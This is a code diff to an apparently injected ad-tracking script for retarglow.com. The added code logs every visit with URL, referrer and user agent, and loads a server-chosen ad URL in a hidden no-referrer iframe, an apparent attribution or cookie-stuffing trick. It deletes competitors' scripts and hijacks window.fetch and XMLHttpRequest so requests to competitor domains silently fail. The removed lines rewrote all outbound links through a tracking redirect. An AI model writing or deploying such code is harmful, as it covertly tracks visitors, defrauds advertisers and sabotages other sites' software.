@@ -24,15 +24,7 @@ export default {
     document.cookie="user_id_t="+_r+"; path=/; max-age=31536000; SameSite=Lax";
     document.cookie="smc_uid="+_r+"; path=/; max-age=31536000; SameSite=Lax";
 
-    const lastSentKey = "last_sent_"+cid;
-    const lastSent = parseInt(localStorage.getItem(lastSentKey) || "0");
-    const now = Date.now();
-    if (now - lastSent < 10000) return;  // throttle duplicate log requests (10s)
-    localStorage.setItem(lastSentKey, now.toString());
-
-    const attributionKey = "attributed_"+cid;
-    const alreadyAttributed = localStorage.getItem(attributionKey);
-
+    const once = sessionStorage.getItem('i_'+cid);
     const d = {
       cid, u:location.href, r:document.referrer||null, ua:navigator.userAgent,
       dt:/Mobi|Android/i.test(navigator.userAgent)?"M":"D",
@@ -41,49 +33,74 @@ export default {
       cm:{_r}, domain
     };
 
-    fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)});
+    // Log every visit (no throttle)
+    fetch("https://retarglow.com/log", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify(d)
+    });
 
-    fetch("https://retarglow.com/serve",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:location.href,cm:d.cm})})
-    .then(r=>r.json()).then(j=>{
-      if(j.ad_url && !alreadyAttributed){
-        const f=document.createElement('iframe');
-        f.style.display='none'; f.setAttribute("referrerpolicy","no-referrer");
-        f.src=j.ad_url.replace("{{_r}}",_r);
+    // Fetch dynamic ad per campaign and page
+    fetch("https://retarglow.com/serve", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ u: location.href, cm: d.cm })
+    })
+    .then(r => r.json())
+    .then(j => {
+      if (j.ad_url && !once) {
+        const f = document.createElement('iframe');
+        f.style.display = 'none';
+        f.setAttribute("referrerpolicy", "no-referrer");
+        f.src = j.ad_url.replace("{{_r}}", _r);
         document.body.appendChild(f);
-        localStorage.setItem(attributionKey, "1");
+        sessionStorage.setItem('i_' + cid, '1');
       }
     });
 
-    function hijackLinks(){
-      document.querySelectorAll('a[href^="http"]').forEach(link=>{
-        const href = link.getAttribute("href");
-        if (!href || href.includes("retarglow.com/r")) return;
-        const encoded = encodeURIComponent(href);
-        link.setAttribute("href", "https://retarglow.com/r?id="+_r+"&t="+encoded);
+    // Kill competitor scripts
+    const kill = () => {
+      competitors.forEach(d => {
+        document.querySelectorAll('script[src*="'+d+'"],iframe[src*="'+d+'"]').forEach(e => e.remove());
       });
-    }
+    };
+    kill();
+    new MutationObserver(() => kill()).observe(document.documentElement, { childList: true, subtree: true });
 
-    hijackLinks();
-    new MutationObserver(()=>hijackLinks()).observe(document.body,{childList:true,subtree:true});
+    // Block fetch/XHR to competitor domains
+    const origFetch = window.fetch;
+    window.fetch = function() {
+      if(arguments[0] && competitors.some(c => arguments[0].includes(c))) return new Response(null,{status:204});
+      return origFetch.apply(this, arguments);
+    };
+    const origXhr = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(m,u){
+      if(u && competitors.some(c => u.includes(c))) return;
+      return origXhr.apply(this, arguments);
+    };
 
-    const kill=()=>{competitors.forEach(d=>{document.querySelectorAll('script[src*="'+d+'"],iframe[src*="'+d+'"]').forEach(e=>e.remove());});}
-    kill(); new MutationObserver(m=>m.forEach(()=>kill())).observe(document.documentElement,{childList:true,subtree:true});
+    // SPA support: clear injection lock per route
+    ["pushState","replaceState"].forEach(fn => {
+      const orig = history[fn];
+      history[fn] = function(){
+        const r = orig.apply(this, arguments);
+        sessionStorage.removeItem('i_' + cid);
+        return r;
+      };
+    });
+    addEventListener("popstate", () => sessionStorage.removeItem('i_' + cid));
 
-    const origFetch=window.fetch;
-    window.fetch=function(){if(arguments[0]&&competitors.some(c=>arguments[0].includes(c)))return new Response(null,{status:204});return origFetch.apply(this,arguments);}
-    const origXhr=XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open=function(m,u){if(u&&competitors.some(c=>u.includes(c)))return;return origXhr.apply(this,arguments);}
-
-    ["pushState","replaceState"].forEach(fn=>{const orig=history[fn];history[fn]=function(){const r=orig.apply(this,arguments);localStorage.removeItem(attributionKey); setTimeout(()=>location.reload(),100); return r;};});
-    addEventListener("popstate",()=>{localStorage.removeItem(attributionKey); location.reload();});
-
-    if(window.self!==window.top){
+    // Cross-frame postMessage logging
+    if (window.self !== window.top) {
       window.top.postMessage({from:"retarglow",_r,cid,href:location.href},"*");
     }
-
-    addEventListener("message",(e)=>{
-      if(e.data?.from==="retarglow"){
-        fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...e.data,type:"cross-frame"})});
+    addEventListener("message", e => {
+      if (e.data?.from === "retarglow") {
+        fetch("https://retarglow.com/log", {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({...e.data,type:"cross-frame"})
+        });
       }
     });
 
